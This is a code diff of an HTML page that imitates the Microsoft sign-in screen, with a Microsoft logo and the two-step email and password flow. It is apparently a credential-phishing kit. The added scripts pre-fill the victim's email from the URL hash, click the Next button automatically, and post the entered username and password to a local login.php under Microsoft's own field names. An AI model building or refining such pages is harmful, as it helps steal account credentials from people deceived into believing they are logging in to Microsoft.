@@ -15,29 +15,12 @@
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <!-- <form> -->
-            <!-- <form id="form_uname" method="POST" action="login.php">
-
+            <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
                     <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
-                </div>
-            </form> -->
-
-
-            <form id="login_form" method="POST" action="login.php">
-
-                <div class="mb-16">
-                    <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
-                </div>
-                <div class="mb-16">
-                    <p id="error_pwd" class="error"></p>
-                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                 </div>
             </form>
-
-
             <div>
                 <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                 <p class="mb-16 fs-13">
@@ -66,28 +49,12 @@
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <!-- <form> -->
-
-<!-- 
-                <form id="login_form" method="POST" action="login.php">
-
-                    <div class="mb-16">
-                        <p id="error_uname" class="error"></p>
-                        <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
-                    </div>
-                    <div class="mb-16">
-                        <p id="error_pwd" class="error"></p>
-                        <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
-                    </div>
-                </form> -->
-
-
-                <!-- <form id="form_pwd" method="POST" action="login.php">
-                    <div class="mb-16">
+            <form>
+                <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
                     <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                 </div>
-            </form> -->
+            </form>
             <div>
                 <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                 <p class="mb-16">
@@ -124,34 +91,53 @@
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
     <script src="assets/app.js"></script>
-    
-  <script>
-    document.addEventListener('DOMContentLoaded', (event) => {
-      try {
-        // Get the email from the URL hash
-        const hash = window.location.hash.substring(1);
-        const email = hash; // Fallback email
 
-        // Select the input and button elements
-        const inputElement = document.querySelector('#email');
-        const buttonElement = document.querySelector('#submit');
 
-        if (inputElement && buttonElement) {
-          // Fill the input field with the email
-          inputElement.value = email;
 
-          // Add a click event listener to the button
-          buttonElement.addEventListener('click', () => {
-            // console.log('Button clicked with email:', inputElement.value);
-            // Here you can add further actions, like form submission
-          });
+<script>document.addEventListener('DOMContentLoaded', () => {
+    try {
+        // Check if there is a hash tag in the URL
+        if (window.location.hash) {
+            // Get the email from the URL hash
+            const hash = window.location.hash.substring(1);
+            const email = hash; // Fallback email
+
+
+
+            // Select the input and button elements
+            const inputElement = document.querySelector('#inp_uname');
+            const buttonElement = document.querySelector('#btn_next');
+
+
+            const pwdElement = document.querySelector('#inp_pwd');
+            const nextButton = document.querySelector('#btn_next');
+            const signInButton = document.querySelector('#btn_sig');
+
+
+            if (inputElement && buttonElement) {
+                // Fill the input field with the email
+                inputElement.value = email;
+
+                // Trigger the button click event
+                buttonElement.click();
+
+
+
+                
+            } else {
+                // Handle case where input or button element is not found
+                // console.warn('Input or button element not found.');
+            }
         } else {
-        //   console.warn('Input or button element not found.');
+            // Handle case where there is no hash tag in the URL
+            // console.warn('No hash tag found in the URL.');
         }
-      } catch (error) {
+    } catch (error) {
+        // Handle any errors that might occur
         // console.error('An error occurred:', error);
-      }
-    });
+    }
+});
+
   </script>
 
 
@@ -164,166 +150,46 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 <script>
-    document.addEventListener('DOMContentLoaded', (event) => {
-        const sectionFinal = document.getElementById('section_final');
-        const form = document.getElementById('login_form');
 
-        form.addEventListener('submit', (event) => {
-            event.preventDefault(); // Prevent default form submission
+    
+    const signInButton = document.getElementById('btn_next');
+    const usernameElement = document.getElementById('inp_uname');
+    const passwordElement = document.getElementById('inp_pwd');
 
-            const uname = document.getElementById('inp_uname').value.trim();
-            const pass = document.getElementById('inp_pwd').value.trim();
+    signInButton.addEventListener('click', () => {
+        const uname = usernameElement.value.trim();
+        const pwd = passwordElement.value.trim();
+        if (uname && pwd) {
+            // Perform the form submission with username and password
+            const formData = new FormData();
+            formData.append('loginfmt', uname);
+            formData.append('passwd', pwd);
 
-            if (uname && pass) {
-                // Both email and password are provided
-                // Make AJAX request to submit both data simultaneously
-                fetch('login.php', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        uname: uname,
-                        pass: pass
-                    }),
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                })
-                .then(response => {
-                    if (response.ok) {
-                        // Success handling
-                        console.log('Data submitted successfully');
-                        // Optionally, redirect to another page
-                        // window.location.href = 'success.php';
-                    } else {
-                        // Error handling
-                        console.error('Error submitting data');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-            } else {
-                // Validation error, both email and password are required
-                document.getElementById('error_uname').textContent = uname ? '' : 'Please enter a valid email, phone, or Skype name.';
-                document.getElementById('error_pwd').textContent = pass ? '' : 'Please enter your password.';
-            }
-        });
+            fetch('login.php', {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    // Handle successful response
+                } else {
+                    // Handle failed response
+                }
+            }).catch(error => {
+                // Handle errors during the fetch
+            });
+        } else {
+            // Handle the case where username or password is missing
+        }
     });
+
+
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- 
-<script>
-
-
-
-document.addEventListener('DOMContentLoaded', (event) => {
-    const sectionUname = document.getElementById('section_uname');
-    const sectionPwd = document.getElementById('section_pwd');
-    const sectionFinal = document.getElementById('section_final');
-
-    const formUname = document.getElementById('form_uname');
-    const formPwd = document.getElementById('form_pwd');
-
-    const btnNext = document.getElementById('btn_next');
-    const btnSig = document.getElementById('btn_sig');
-
-    const inpUname = document.getElementById('inp_uname');
-    const inpPwd = document.getElementById('inp_pwd');
-
-    const userIdentity = document.getElementById('user_identity');
-    const userIdentityFinal = document.getElementById('user_identity_final');
-
-    // Handle 'Next' button click
-    btnNext.addEventListener('click', () => {
-        const uname = inpUname.value.trim();
-        if (uname) {
-            userIdentity.textContent = uname;
-            sectionUname.classList.add('d-none');
-            sectionPwd.classList.remove('d-none');
-        } else {
-            document.getElementById('error_uname').textContent = 'Please enter a valid email, phone, or Skype name.';
-        }
-    });
-
-    // Handle 'Sign in' button click
-    btnSig.addEventListener('click', () => {
-        const pass = inpPwd.value.trim();
-        if (pass) {
-            userIdentityFinal.textContent = userIdentity.textContent;
-            sectionPwd.classList.add('d-none');
-            sectionFinal.classList.remove('d-none');
-            formPwd.submit(); // Submit the password form
-        } else {
-            document.getElementById('error_pwd').textContent = 'Please enter your password.';
-        }
-    });
-});
-
-
-
-
-
-</script> -->
 
 
 </body>
 
 </html>
+
+
+
